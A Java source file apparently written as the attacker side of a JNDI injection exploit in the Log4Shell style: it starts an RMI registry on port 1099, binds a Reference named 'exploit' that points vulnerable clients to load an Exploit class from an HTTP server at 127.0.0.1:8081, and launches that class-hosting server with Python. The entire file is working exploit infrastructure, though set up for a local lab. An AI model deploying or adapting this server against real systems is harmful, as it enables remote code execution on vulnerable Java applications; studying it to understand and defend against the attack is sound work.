package org.mazhuang.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author mazhuang
 * @date 2021/12/11
 */
public class RmiServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            Reference reference = new Reference(Exploit.class.getName(), Exploit.class.getName(), "http://127.0.0.1:8081/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("exploit", referenceWrapper);

            System.out.println("RMI Server started");

            new Thread() {
                @Override
                public void run() {
                    String[] cmds = new String[] { "python3", "-m", "http.server", "--directory", "rmi-server/target/classes/", "8081"};
                    try {
                        System.out.println("Class factory server starting...");
                        Runtime.getRuntime().exec(cmds).waitFor();
                    } catch (InterruptedException | IOException e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        } catch (RemoteException | NamingException | AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}
